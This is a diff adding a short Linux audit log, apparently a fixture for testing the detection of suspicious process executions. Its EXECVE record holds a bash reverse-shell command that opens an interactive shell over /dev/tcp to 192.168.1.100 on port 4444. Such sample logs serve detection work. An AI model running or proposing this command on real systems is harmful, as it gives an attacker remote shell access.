@@ -1,0 +1,5 @@
+type=SYSCALL msg=audit(1642267800.789:3001): arch=c000003e syscall=59 success=yes exit=0 a0=7ffd99887766 a1=7ffd99887780 a2=7ffd99887790 a3=0 items=2 ppid=5555 pid=54321 auid=1001 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts2 ses=7 comm="bash" exe="/bin/bash" key=(null)
+type=EXECVE msg=audit(1642267800.789:3001): argc=3 a0="bash" a1="-i" a2=">& /dev/tcp/192.168.1.100/4444 0>&1"
+type=CWD msg=audit(1642267800.789:3001): cwd="/tmp"
+type=PATH msg=audit(1642267800.789:3001): item=0 name="/bin/bash" inode=654321 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0
+type=PROCTITLE msg=audit(1642267800.789:3001): proctitle=626173680-2D69
